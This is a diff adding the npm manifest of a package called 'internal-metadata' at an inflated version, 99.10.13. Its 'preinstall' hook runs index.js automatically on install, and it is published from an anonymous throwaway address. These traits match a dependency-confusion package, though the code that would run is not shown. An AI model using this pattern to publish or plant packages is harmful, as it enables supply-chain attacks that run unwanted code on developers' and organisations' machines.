@@ -1,0 +1,39 @@
+{
+    "name": "internal-metadata",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "internal-metadata@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-UDd/xOUjo5KnBsbt2lSkE2MaWp3S8XezDyjDGyH4verFni1GWBP/FmFeZL6taPzpgiBXzmX5jdiBXnZMU87f4w==",
+        "shasum": "42c7a9636efffbd7369dac156465f3efcfe7c72a",
+        "tarball": "https://registry.npmjs.org/internal-metadata/-/internal-metadata-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5075,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXOACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmqi/RAAi9VBN5hJywxLMAvijH1Vgg6G0MOEjFHyqHQfDkxSZxgl6TMN\r\nXnPCsok5afm8Bf9lpx5LYxo7HqPYpFAeRQvv8y/XMjYDbL8/4k05Hoq2umQN\r\nx7mQGYbWGd2NTfkn9rxrcjLSz7r6xBQl71lEnlXR+LpuULM5oQr8X2unTGE/\r\nJegCPpfrpAyV3c1s2cWYDXv0HdUnsPIX1g0hrZcaziWG1VSWfn+/IPCva3pb\r\nAxpqtSAKbfM/195W9hhn9LrUdw/tjNkRvT08an8GfSdtJlQCZeVgt239I4Jk\r\nDFzjDVjlZibK2yP7SsZNtX/0zN03AsJh1Pg9yX8q0MlvBM79plBchMxF+YIN\r\nDKUppyJvOtfME7VGdM70NPFMqEE0fKu55G3F7K+H0UMnr6KEEVXZomUTVly1\r\nJs9b1LrT7q9Pqr3Q/uQWNSWLUpG1gVYRSYTHlj1OfQ4qDFVZvKt1BXkt08go\r\npe+1rwqMFjN4pNrjJPHoS6SGZWlJLutJDZGANpyX1kSdCV3L1aiv887boF+r\r\nKVwMx7WyHSe7QENYawLMRokQLsZXFlhjckpYtk4xkhE3HV+KGh59kd5AeSF1\r\nU/bfBfDfNbcARZObeIaznctFNb5JSJdAgLBFO8LLg2/BEGukN2dTrrpC52kT\r\nv+zQEQJ9j71IGXdpahg6V8uTSu8q59qvvGs=\r\n=YZk6\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "1m7w2kp4",
+        "email": "1m7w2kp4@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "1m7w2kp4",
+            "email": "1m7w2kp4@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/internal-metadata_99.10.13_1648420302274_0.36432239774463104"
+    },
+    "_hasShrinkwrap": false
+}
